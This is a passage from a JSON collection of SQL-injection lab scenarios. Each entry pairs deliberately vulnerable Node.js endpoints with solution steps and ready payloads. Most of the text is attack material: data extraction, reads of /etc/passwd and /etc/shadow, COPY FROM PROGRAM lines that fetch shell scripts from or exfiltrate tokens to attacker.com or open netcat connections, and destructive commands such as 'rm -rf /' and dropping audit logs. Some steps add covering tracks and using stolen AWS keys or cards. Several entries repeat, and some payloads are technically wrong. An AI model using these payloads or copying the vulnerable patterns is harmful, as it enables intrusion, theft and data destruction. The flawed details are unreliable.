    "payloads": [
      "\"1' UNION SELECT table_name,column_name FROM information_schema.columns--",
      "\"1' UNION SELECT encode(convert_to(pg_read_file('/etc/passwd'),'base64'),'hex'--"
    ]
  },
  {
    "Lab scenario": "Government Portal Out-of-Band SQLi in PDF Generator",
    "Lab Description": "Report generation feature allows DNS exfiltration through malicious SQL queries. To solve: Extract sensitive records using OOB techniques.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Set up DNS listener with Burp Collaborator",
      "Craft payload: ' || (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users),'.attacker.com\\\\test.txt')))--",
      "Trigger PDF report generation",
      "Monitor DNS queries for exfiltrated data",
      "Bypass firewall using alternate protocols"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/generate-report', (req, res) => {\n  const params = req.body.params;\n  const query = `SELECT * FROM citizens WHERE ${params}`;\n  \n  // Runs query and generates PDF\n  generatePDF(query);\n});",
    "payloads": [
      "' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.attacker.com\\test'))--",
      "'||(SELECT MAKE_SET(2063,CONCAT('exfil.',(SELECT password))))--"
    ]
  },
  {
    "Lab scenario": "Social Media Platform Filter Evasion SQLi",
    "Lab Scenario": "Search feature with WAF blocking common SQLi patterns. To solve: Bypass filters using alternative syntax and encoding.",
    "Lab Description": "The application uses a web application firewall blocking UNION and SELECT keywords. To solve: Extract user emails using alternative syntax and comment bypasses.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify allowed characters using Postman fuzzing",
      "Bypass WAF using %00 NULL bytes",
      "Use alternative syntax: ' || (SELECT 1 FROM users)::text --",
      "Exfiltrate data via case-sensitive keywords",
      "Use alternative comment syntax: /*!50000SELECT*/"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search', (req, res) => {\n  const term = req.query.q.replace(/[;'-]/g, '');\n  const query = `SELECT * FROM posts WHERE content LIKE '%${term}%'`;\n  \n  db.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "'%00UNION%00SELECT%00email%00FROM%00users--",
      "'/**/OR/**/1=(SELECT/**/COUNT(*)/**/FROM/**/users)--"
    ]
  },
  {
    "Lab scenario": "Education Platform JWT-Triggered SQLi",
    "Lab Description": "User dashboard vulnerable to SQLi through JWT claims. To solve: Modify JWT to inject SQL payloads through user ID claim.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Decode JWT using jwt.io",
      "Modify sub claim to: ' OR admin=true--",
      "Sign with null signature algorithm",
      "Extract password hashes via UNION attack",
      "Crack hashes using John The Ripper"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/dashboard', (req, res) => {\n  const userId = jwtVerify(req.cookies.token).sub;\n  const query = `SELECT * FROM users WHERE id='${userId}'`;\n  \n  db.query(query, (err, result) => {\n    res.json(result.rows[0]);\n  });\n});",
    "payloads": [
      "' UNION SELECT password,NULL FROM users--",
      "'; UPDATE users SET password='hacked' WHERE id='admin'--"
    ]
  },
  {
    "Lab scenario": "Logistics Tracking System Polyglot SQLi in XML Parameter",
    "Lab Description": "Shipment tracking API vulnerable through XML/SQL polyglot payloads. To solve: Achieve RCE via stacked queries and COPY FROM PROGRAM.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Craft XML payload containing SQL statements",
      "Bypass parser using CDATA sections",
      "Execute OS commands: '; COPY logs FROM PROGRAM 'curl attacker.com/shell.sh'--",
      "Create reverse shell using netcat",
      "Clean logs using VACUUM command"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/track', (req, res) => {\n  const xml = req.body.xml;\n  const trackingId = extractXPath(xml, '//id');\n  const query = `SELECT * FROM shipments WHERE id='${trackingId}'`;\n  \n  db.query(query, (err, result) => {\n    res.xml(result.rows);\n  });\n});",
    "payloads": [
      "'%3BCOPY%20files%20FROM%20PROGRAM%20'rm%20-rf%20/'--",
      "<![CDATA[' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--]]>"
    ]
  },
  {
    "Lab scenario": "Healthcare Portal Error-Based SQLi in HAVING Clause",
    "Lab Description": "A hospital's patient statistics dashboard allows filtering by department and uses the user input directly in the HAVING clause of a SQL query. Due to lack of input sanitization, attackers can trigger error-based SQL injection to extract sensitive database metadata. This lab demonstrates exploitation using PostgreSQL type casting errors and common table expressions (CTEs) to enumerate tables and leak medical record IDs.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the GET /stats request using Burp Suite or a proxy tool",
      "Inject into the filter parameter: 1=CAST((SELECT current_database()) AS INTEGER)--",
      "Observe the error message returned by PostgreSQL and use it to infer schema names",
      "Construct payloads with UNION or CTE to enumerate medical records"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/stats', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT department, COUNT(*) FROM patients GROUP BY department HAVING ${filter}`;\n  pool.query(query, (err, result) => {\n    if(err) res.status(500).send(err.toString());\n    else res.json(result.rows);\n  });\n});",
    "payloads": [
      "1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INTEGER)--",
      "1=1 AND (SELECT 1 FROM patient_records WHERE ssn LIKE '123%')=1--"
    ]
  },
  {
    "Lab scenario": "IoT Device Time-Based SQLi via MQTT Protocol",
    "Lab Description": "An MQTT broker receives JSON-encoded telemetry data from smart devices and writes it to a SQL database. Since the MQTT handler does not sanitize incoming values, attackers can inject SQL into the `device_id` field. This lab explores time-based SQL injection to exfiltrate API keys from the database by measuring conditional delays caused by `pg_sleep`.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture MQTT messages from a compromised or test IoT device",
      "Inject a time delay: '; SELECT CASE WHEN (ASCII(SUBSTR(api_key,1,1))>100) THEN pg_sleep(5) END FROM devices--",
      "Use a timing-based measurement tool or script to determine when delays occur",
      "Automate full key extraction using a binary search script"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "mqttClient.on('message', (topic, msg) => {\n  const data = JSON.parse(msg);\n  const query = `INSERT INTO telemetry (device_id, value) VALUES ('${data.id}', '${data.value}')`;\n  pool.query(query);\n});",
    "payloads": [
      "'; SELECT pg_sleep(5) FROM devices WHERE id=1--",
      "'||(SELECT CASE WHEN (SELECT COUNT(*) FROM api_keys)=3 THEN pg_sleep(2) END)--"
    ]
  },
  {
    "Lab scenario": "CMS Second-Order SQLi in User Registration",
    "Lab Description": "A content management system stores user input during registration and later uses it unsanitized during scheduled report generation. This lab demonstrates second-order SQL injection, where malicious data triggers SQL execution not during entry, but during later backend processing (e.g., admin reporting or logs).",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Register with a malicious username: admin'||(SELECT CURRENT_USER))--",
      "Wait for the system to run its daily scheduled report that includes user data",
      "Review the exported report or admin panel for executed SQL results"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/register', (req, res) => {\n  const username = req.body.username;\n  const query = `INSERT INTO users (username) VALUES ('${username}')`;\n  pool.query(query);\n  res.send('Pending approval');\n});",
    "payloads": [
      "test'||(SELECT pg_read_file('/etc/passwd'))--",
      "admin'||(COPY (SELECT * FROM secrets) TO PROGRAM 'curl attacker.com?exfil=$(data)'--"
    ]
  },
  {
    "Lab scenario": "Banking Portal Boolean-Blind SQLi in Transaction Search",
    "Lab Description": "The transaction search feature returns true/false based on user-defined queries. Since there's no direct error or output, Boolean-based blind SQL injection is needed. Attackers can infer information like account balances by manipulating the query logic and observing application behavior.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Craft queries with true/false conditions using the AND operator",
      "Submit queries via the /search endpoint and observe response changes",
      "Use tools like sqlmap with --technique=B for automated exploitation",
      "Perform binary search to guess numeric values like balances"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/search', (req, res) => {\n  const query = req.body.query;\n  const sql = `SELECT EXISTS(SELECT 1 FROM transactions WHERE ${query})`;\n  pool.query(sql, (err, result) => {\n    res.json({ found: result.rows[0].exists });\n  });\n});",
    "payloads": [
      "description LIKE '%test%' AND (SELECT SUBSTR(CAST(balance AS TEXT),1,1) FROM accounts)='5'--",
      "amount > 0 AND (SELECT COUNT(*) FROM users WHERE username='admin')=1--"
    ]
  },
  {
    "Lab scenario": "E-Commerce Filter Evasion SQLi with Unicode Bypass",
    "Lab Description": "The product search field filters user input by stripping single quotes, but it fails to detect alternate encodings. Attackers can exploit this by using Unicode-encoded apostrophes to bypass the sanitization and extract payment data from the backend.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send URL-encoded requests using %u0027 instead of standard apostrophes",
      "Inject UNION SELECT queries using alternate encodings",
      "Decode hex or base64-encoded results returned in JSON"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search', (req, res) => {\n  const term = req.query.q.replace(/'/g, '');\n  const query = `SELECT * FROM products WHERE name LIKE '%${term}%'`;\n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "%u0027 UNION SELECT NULL,pan,NULL FROM payments--",
      "%u0027 OR 1=CAST((SELECT COUNT(*) FROM payments) AS INTEGER)--"
    ]
  },
  {
    "Lab scenario": "Logistics Tracking Out-of-Band SQLi via DNS",
    "Lab Description": "A vulnerable shipment tracker constructs SQL queries from user input and allows attackers to trigger out-of-band SQLi using DNS exfiltration. This lab illustrates exfiltrating AWS keys via DNS queries using the `LOAD_FILE` or `MAKE_SET` functions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Deploy a DNS listener or Burp Collaborator server",
      "Craft payloads that call out to your DNS server with secrets",
      "Monitor DNS logs for stolen data",
      "Use the stolen data in an AWS environment"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/track', (req, res) => {\n  const id = req.query.id;\n  const query = `SELECT * FROM shipments WHERE id='${id}'`;\n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "'||(SELECT MAKE_SET(2063,CONCAT('exfil.',(SELECT secret_key)))--",
      "' UNION SELECT NULL,ENCODE(pg_read_binary_file('/etc/passwd'),'base64')--"
    ]
  },
  {
    "Lab scenario": "Social Media JWT-Triggered SQLi in Profile Load",
    "Lab Description": "The application uses JWT tokens and places the 'sub' claim directly into SQL queries to load user profiles. An attacker can forge a token and manipulate the claim to perform SQL injection. This lab demonstrates bypassing authentication and accessing another user's messages.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Decode the JWT token and modify the 'sub' field to: ' OR 1=1--",
      "Re-sign the token using 'alg':'none' or a leaked key",
      "Access the /profile endpoint with the modified JWT",
      "Review the returned messages"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/profile', (req, res) => {\n  const userId = jwtVerify(req.headers.authorization).sub;\n  const query = `SELECT * FROM users WHERE id='${userId}'`;\n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL,message,NULL FROM inbox--",
      "'||(SELECT group_concat(message) FROM inbox)--"
    ]
  },
  {
    "Lab scenario": "Education Platform Stacked SQLi in CSV Export",
    "Lab Description": "An export feature accepts filtering criteria in a query used in PostgreSQL's COPY command. Lack of sanitization allows stacked SQL queries. This lab shows how attackers can chain malicious SQL to perform remote command execution (RCE) via COPY FROM PROGRAM.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Inject a stacked query into the export filter: ; COPY grades FROM PROGRAM 'curl https://attacker.com/shell.sh'--",
      "Trigger the report/export generation",
      "Verify RCE by checking listener or shell connection"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/export', (req, res) => {\n  const filter = req.query.filter;\n  const query = `COPY (SELECT * FROM grades WHERE ${filter}) TO STDOUT CSV`;\n  pool.query(query);\n  res.attachment('grades.csv');\n});",
    "payloads": [
      "; CREATE TABLE exfil AS SELECT * FROM passwords--",
      "; DROP TABLE audit_logs;--"
    ]
  },
  {
    "Lab scenario": "Government Portal XML SQLi in SOAP Service",
    "Lab Description": "A SOAP endpoint accepts XML input and uses XPath to extract user input before inserting it into a SQL query. This allows hybrid XML-SQL injection. Attackers can use CDATA or entity expansion to inject SQL and retrieve citizen SSNs from the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Craft an XML payload with SQL injection wrapped in CDATA",
      "Submit to the /soap endpoint",
      "Parse the resulting XML for leaked data",
      "Use entity encoding to bypass XML parsers"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/soap', (req, res) => {\n  const xml = req.rawBody;\n  const id = extractXPath(xml, '//citizen_id');\n  const query = `SELECT * FROM citizens WHERE id='${id}'`;\n  pool.query(query, (err, result) => {\n    res.xml(result.rows);\n  });\n});",
    "payloads": [
      "<![CDATA[' UNION SELECT ssn,NULL FROM citizens--]]>",
      "'||(SELECT xmlagg(xmlelement(name data, ssn)) FROM citizens)--"
    ]
  },
  {
    "Lab scenario": "Pharmacy Management System Error-Based SQLi in HAVING Clause",
    "Lab Description": "A medication inventory system generates reports using vulnerable HAVING conditions. The PostgreSQL backend returns verbose type conversion errors containing sensitive data. The application aggregates results from multiple tables but fails to sanitize the 'threshold' parameter. To solve: Extract patient SSNs by forcing mismatched data type errors through controlled CAST operations.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept POST /reports request with Burp Suite",
      "Inject: HAVING 1=CAST((SELECT ssn FROM patients LIMIT 1) AS INTEGER)--",
      "Analyze error message for full SSN leakage",
      "Automate extraction using recursive CTE expressions",
      "Bypass column masking through multiple error triggers"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/reports', (req, res) => {\n  const threshold = req.body.threshold;\n  const query = `SELECT medication, COUNT(*) FROM prescriptions \n    GROUP BY medication HAVING COUNT(*) > ${threshold}`;\n  pool.query(query, (err, result) => {\n    if(err) res.status(500).send(err.toString());\n    else res.json(result.rows);\n  });\n});",
    "payloads": [
      "100 UNION SELECT CAST(ssn AS INTEGER) FROM patients--",
      "1=CAST((SELECT current_setting('data_directory')) AS NUMERIC)--"
    ]
  },
  {
    "Lab scenario": "Insurance Claim System UNION-Based SQLi with Type Juggling",
    "Lab Description": "A claims processing portal constructs dynamic UNION queries using unsanitized user input in the 'document_type' parameter. The MySQL backend performs implicit type conversion between JSON and string types. To solve: Bypass column type checks using JSON_ARRAY and extract adjuster credentials.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify injectable parameter through fuzzing with OWASP ZAP",
      "Determine column count using ORDER BY with JSON_LENGTH",
      "Craft payload: medical UNION SELECT JSON_ARRAY(adjuster_id,password) FROM adjusters--",
      "Handle JSON parsing anomalies in claim results",
      "Decode base64-embedded credentials in nested objects"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/claims', (req, res) => {\n  const type = req.query.document_type;\n  const query = `SELECT id, details FROM claims WHERE document_type='${type}' \n    UNION SELECT id, document FROM archived_claims`;\n  pool.query(query, (err, result) => {\n    res.json(result);\n  });\n});",
    "payloads": [
      "medical' UNION SELECT 1,JSON_OBJECT('user',adjuster,'pass',password) FROM adjusters--",
      "dental' UNION SELECT NULL,LOAD_FILE('/etc/passwd')--"
    ]
  },
  {
    "Lab scenario": "E-Commerce Platform Second-Order SQLi in Product Reviews",
    "Lab Description": "A product review system stores unsanitized user comments that later get used in inventory management SQL queries. The Node.js backend escapes output but not storage. To solve: Poison the review system with delayed payloads that trigger during stock reconciliation cron jobs.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit review with payload: '||(SELECT pg_sleep(10) FROM products)--",
      "Monitor cron job execution timing via server logs",
      "Construct payload to copy database to public directory",
      "Access stolen DB copy via /static/backup.sql",
      "Cover tracks through VACUUM and log rotation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/reviews', (req, res) => {\n  const review = req.body.text;\n  const query = `INSERT INTO reviews (product_id, text) \n    VALUES (${req.params.id}, '${review}')`;\n  pool.query(query);\n  res.redirect('/product');\n});",
    "payloads": [
      "Great product!'||(SELECT pg_dump('public')::text)--",
      "Awesome!'||(COPY products TO PROGRAM 'nc attacker.com 4444')--"
    ]
  },
  {
    "Lab scenario": "Telemedicine Platform JSON Path SQLi in Patient Search",
    "Lab Description": "A patient lookup feature uses JSONB path expressions in PostgreSQL with unsanitized input. The system allows path traversal via lateral joins. To solve: Extract mental health records by abusing jsonb_to_recordset function in WHERE clause.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable JSON path parameter through fuzzing",
      "Escape JSON context using @? operator: ' || (SELECT jsonb_build_object('data', notes))--",
      "Use lateral joins to access adjacent tables",
      "Bypass field-level encryption through memory inspection",
      "Decrypt results using leaked AWS KMS credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/search', (req, res) => {\n  const path = req.body.jsonPath;\n  const query = `SELECT * FROM patients \n    WHERE metadata @? '${path}'::jsonpath`;\n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "$..* ? (@.sensitive == true)",
      "lax $.** ! (@.redacted == true)"
    ]
  },
  {
    "Lab scenario": "Banking Transaction Audit System - UNION-Based SQLi in CSV Export",
    "Lab Description": "A financial auditing feature generates CSV reports using unsanitized input in ORDER BY clauses. The Oracle backend allows UNION injection through numeric column manipulation. Error messages reveal full query structure but are masked in production. To solve: Extract SWIFT codes from international_transfers table while maintaining column type consistency and bypassing CSV escaping mechanisms.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept POST /audit/export request with Burp Suite",
      "Identify injectable parameter: sort=transaction_date",
      "Determine column count: ' ORDER BY 7-- (throws error at 8)",
      "Craft type-compatible payload: ' UNION SELECT NULL,swift_code,NULL,NULL,NULL,NULL,NULL FROM international_transfers--",
      "Bypass CSV encapsulation using CHR(9) tab separation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/audit/export', (req, res) => {\n  const sortColumn = req.body.sort;\n  const query = `SELECT * FROM transactions ORDER BY ${sortColumn}`;\n  // Vulnerable CSV generation\n  oracle.execute(query, (err, result) => {\n    const csv = result.rows.map(r => Object.values(r).join(',')).join('\\n');\n    res.attachment('report.csv').send(csv);\n  });\n});",
    "payloads": [
      "transaction_date UNION SELECT NULL,swift_code,NULL,NULL,NULL,NULL,NULL FROM international_transfers--",
      "amount UNION SELECT NULL,TO_CHAR(DBMS_LOB.SUBDOMAIN(secret_doc,1000,1)),NULL,NULL,NULL,NULL,NULL FROM internal_docs--"
    ]
  },
  {
    "Lab scenario": "CMS Time-Based SQLi in User Registration",
    "Lab Description": "The user registration form stores unsanitized input used in password reset emails. The MySQL backend allows time-based injection through delayed query execution. To solve: Extract administrator password hash through conditional SLEEP operations.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Register user with payload: ' OR IF(ASCII(SUBSTR(password,1,1))>97, SLEEP(3), 0)--",
      "Measure response times with Burp Suite's Repeater",
      "Automate extraction using Python requests and timing analysis",
      "Crack bcrypt hash using Hashcat",
      "Login with compromised credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/register', (req, res) => {\n  const email = req.body.email;\n  const query = `INSERT INTO users (email) VALUES ('${email}')`;\n  console.debug('Raw query:', query); // Verbose logging\n  pool.query(query);\n  res.send('Confirmation email sent');\n});",
    "payloads": [
      "' OR IF(ASCII(SUBSTR((SELECT password FROM users LIMIT 1),1,1))=97, SLEEP(5), 0)--",
      "' XOR (SELECT 1 FROM (SELECT SLEEP(5))slowQuery)--"
    ]
  },
  {
    "Lab scenario": "Healthcare Portal Error-Based SQLi in GROUP BY",
    "Lab Description": "Patient statistics dashboard leaks PostgreSQL errors through vulnerable GROUP BY clause. The application displays full query syntax in debug mode. To solve: Extract medical record IDs using type conversion errors and CTE injections.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept /stats request with Burp Suite",
      "Trigger error: ' GROUP BY CAST((SELECT ssn FROM patients) AS INTEGER)--",
      "Extract sensitive data from verbose errors",
      "Bypass column masking using multiple error triggers",
      "Disable debug mode through parameter manipulation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/stats', (req, res) => {\n  const group = req.query.group;\n  const query = `SELECT ${group}, COUNT(*) FROM patients GROUP BY ${group}`;\n  console.error('Failed query:', query); // Error leakage\n  pool.query(query, (err, result) => {\n    if(err) res.status(500).send(err.toString());\n    else res.json(result.rows);\n  });\n});",
    "payloads": [
      "CASE WHEN 1=1 THEN diagnosis ELSE CAST((SELECT ssn) AS INTEGER) END--",
      "CAST((SELECT current_database()) AS INTEGER)"
    ]
  },
  {
    "Lab scenario": "E-Commerce Platform Boolean-Based SQLi in Search",
    "Lab Description": "Product search feature returns different HTTP status codes based on query truthiness. The SQLite backend allows boolean inference through response variation. To solve: Extract credit card numbers through binary search character extraction.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept POST /search with OWASP ZAP",
      "Identify boolean trigger: ' OR 1=1 AND 'a'='a",
      "Automate with sqlmap: sqlmap -r request.txt --technique=B",
      "Brute-force PAN using bitwise operations",
      "Validate cards through payment API endpoint"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/search', (req, res) => {\n  const term = req.body.query;\n  const query = `SELECT * FROM products WHERE name LIKE '%${term}%'`;\n  db.get(query, (err, row) => {\n    res.status(row ? 200 : 404).send();\n  });\n});",
    "payloads": [
      "' OR (SELECT COUNT(*) FROM payments WHERE SUBSTR(pan,1,1)='4')=1--",
      "' AND (SELECT LENGTH(pan) FROM payments)=16--"
    ]
  },
  {
    "Lab scenario": "Social Media Platform JWT-SQLi in Profile Load",
    "Lab Description": "User profile endpoint uses JWT claims directly in SQL queries. The application allows JWT algorithm none and has broken signature validation. To solve: Forge admin token and extract private messages through UNION attacks.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Decode JWT using jwt.io",
      "Modify 'sub' claim to: ' UNION SELECT message FROM inbox--",
      "Sign with 'none' algorithm",
      "Bypass CSRF protection using CORS misconfiguration",
      "Extract messages from API response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/profile', (req, res) => {\n  const userId = jwtVerify(req.cookies.token).sub;\n  const query = `SELECT * FROM users WHERE id='${userId}'`;\n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL,message,NULL FROM inbox--",
      "'||(SELECT group_concat(message) FROM inbox)--"
    ]
  },
  {
    "Lab scenario": "E-Commerce Platform UNION-Based SQLi in Product Filter",
    "Lab Description": "The product search feature directly concatenates user input into a WHERE clause with no parameterization. The MySQL backend returns verbose errors containing database structure details. The application executes: SELECT * FROM products WHERE category = '${input}' AND status = 1. To solve: Extract customer credit card numbers through UNION attacks while bypassing column type restrictions.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept GET /products?category=electronics with Burp Suite",
      "Determine column count using ORDER BY 6--",
      "Identify numeric columns through error analysis",
      "Craft payload: ' UNION SELECT NULL,pan,NULL,NULL,NULL,NULL FROM payments--",
      "Bypass WAF using HTML entity encoding"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/products', (req, res) => {\n  const category = req.query.category;\n  const query = `SELECT id,name,price FROM products WHERE category = '${category}'`;\n  console.error('Query failed:', query); // Error leakage\n  pool.query(query, (err, result) => {\n    res.json(result);\n  });\n});",
    "payloads": [
      "electronics' UNION SELECT 1,pan,3,4,5,6 FROM payments--",
      "' UNION SELECT NULL,@@version,NULL,NULL,NULL,NULL--"
    ]
  },
  {
    "Lab scenario": "Government Portal Boolean-Blind SQLi in Document Search",
    "Lab Description": "The public records search feature uses unsanitized input in a HAVING clause with identical 200/404 responses. The PostgreSQL backend allows boolean inference through response existence checks. The application executes: SELECT doc_id FROM archives GROUP BY doc_id HAVING ${input}. To solve: Extract classified document titles through binary search character extraction.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Fuzz HAVING parameter with OWASP ZAP",
      "Identify boolean trigger: ' OR 1=1 AND '1'='1",
      "Automate with sqlmap: sqlmap -u ... --technique=B --dbms=PostgreSQL",
      "Brute-force titles using SUBSTR and ASCII comparisons",
      "Reconstruct documents from extracted fragments"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/search', (req, res) => {\n  const filter = req.body.filter;\n  const query = `SELECT doc_id FROM archives GROUP BY doc_id HAVING ${filter}`;\n  pool.query(query, (err, result) => {\n    res.status(result.rowCount > 0 ? 200 : 404).send();\n  });\n});",
    "payloads": [
      "1=1 AND (SELECT SUBSTR(title,1,1) FROM classified_docs)='T'",
      "EXISTS(SELECT 1 FROM restricted WHERE clearance_level > 5)"
    ]
  },
  {
    "Lab scenario": "Social Media Platform Second-Order SQLi in Comments",
    "Lab Description": "Comment storage system escapes output but not input validation, allowing second-order injection in analytics reports. The application executes: INSERT INTO comments (text) VALUES ('${input}') and later SELECT * FROM comments WHERE ${reportFilter}. To solve: Poison comment system to execute malicious payloads during report generation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Post comment: '||(SELECT CURRENT_USER))--",
      "Wait for daily report generation cron job",
      "Exploit time-delayed payload execution",
      "Exfiltrate OAuth tokens through DNS subdomains",
      "Clean logs through parameter tampering"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/comment', (req, res) => {\n  const text = req.body.text;\n  const query = `INSERT INTO comments (text) VALUES ('${text}')`;\n  console.debug('New comment:', query); // Verbose logging\n  pool.query(query);\n  res.send('Comment posted');\n});",
    "payloads": [
      "'||(COPY (SELECT * FROM oauth_tokens) TO PROGRAM 'curl https://attacker.com?exfil=$(data)'--",
      "'||(SELECT pg_sleep(10) FROM users)--"
    ]
  },
  {
    "Lab scenario": "Education Platform Error-Based SQLi in Gradebook",
    "Lab Description": "Online gradebook system leaks MySQL errors through vulnerable GROUP BY clause. The application executes: SELECT student_id FROM grades GROUP BY ${input}. To solve: Extract hashed passwords through type conversion errors and UNION payloads.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept POST /gradebook request with Burp Suite",
      "Trigger error: GROUP BY CAST((SELECT password FROM admins) AS INTEGER)--",
      "Extract bcrypt hashes from error messages",
      "Bypass column count restrictions using NULL padding",
      "Crack hashes using rainbow tables"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/gradebook', (req, res) => {\n  const group = req.query.group;\n  const query = `SELECT student_id FROM grades GROUP BY ${group}`;\n  pool.query(query, (err, result) => {\n    if(err) res.status(500).send(err.sqlMessage); // Error leakage\n    else res.json(result);\n  });\n});",
    "payloads": [
      "student_id UNION SELECT NULL,password,NULL FROM admins--",
      "CAST((SELECT email FROM students) AS UNSIGNED)"
    ]
  },
  {
    "Lab scenario": "Shipping Logistics UNION SQLi in Tracking API",
    "Lab Description": "Package tracking system incorporates user input directly into ORDER BY clauses. The application executes: SELECT * FROM shipments ORDER BY ${input}. To solve: Extract sensitive customer addresses through UNION attacks with explicit type casting.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept GET /track?sort=status with Postman",
      "Determine column count using incremental ORDER BY",
      "Identify VARCHAR columns through NULL replacement",
      "Craft payload: status UNION SELECT NULL,address,NULL FROM customers--",
      "Bypass WAF using multiline comments"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/track', (req, res) => {\n  const sort = req.query.sort;\n  const query = `SELECT id, status FROM shipments ORDER BY ${sort}`;\n  console.log('Tracking query:', query); // Verbose logging\n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "status UNION SELECT NULL,CONCAT(name,': ',address),NULL FROM customers--",
      "id UNION SELECT NULL,pg_read_file('/etc/shadow'),NULL--"
    ]
  },
  {
    "Lab scenario": "Smart Home Controller JWT-SQLi in Device Management",
    "Lab Description": "Device control API uses JWT claims directly in SQL queries with broken signature validation. The application executes: SELECT * FROM devices WHERE owner = '${jwt.sub}'. To solve: Forge admin JWT and takeover all smart devices.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Decode JWT using jwt.io",
      "Modify sub claim to: ' UNION SELECT 1,'admin','*' FROM users--",
      "Sign with 'none' algorithm",
      "Bypass CSRF protection using CORS misconfig",
      "Execute mass device reset command"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/devices', (req, res) => {\n  const userId = jwtVerify(req.headers.auth).sub;\n  const query = `SELECT * FROM devices WHERE owner = '${userId}'`;\n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "' UNION SELECT 1,device_id,'admin' FROM devices--",
      "'||(SELECT group_concat(password) FROM users)--"
    ]
  },
  {
    "Lab scenario": "Voting System - Error-Based SQL Injection in Poll Results",
    "Lab Description": "An online voting application displays poll results aggregated via SQL. The `poll_id` is taken from a GET parameter and directly injected into a GROUP BY query without sanitization. By leveraging error-based SQL injection with improper type casting, an attacker can extract database names and user tables using verbose PostgreSQL error messages. This lab demonstrates how misusing numeric casting in error messages can lead to data disclosure.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Access the endpoint: /polls/results?poll_id=1",
      "Inject: poll_id=1::int OR CAST((SELECT version()) AS int)--",
      "Read the error message to determine database version",
      "Enumerate tables via error extraction"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/polls/results', (req, res) => {\n  const pollId = req.query.poll_id;\n  const query = `SELECT option, COUNT(*) FROM votes WHERE poll_id = ${pollId} GROUP BY option`;\n  pool.query(query, (err, result) => {\n    if (err) return res.status(500).send(err.message);\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "1::int OR CAST((SELECT current_user) AS int)--",
      "1 OR CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--"
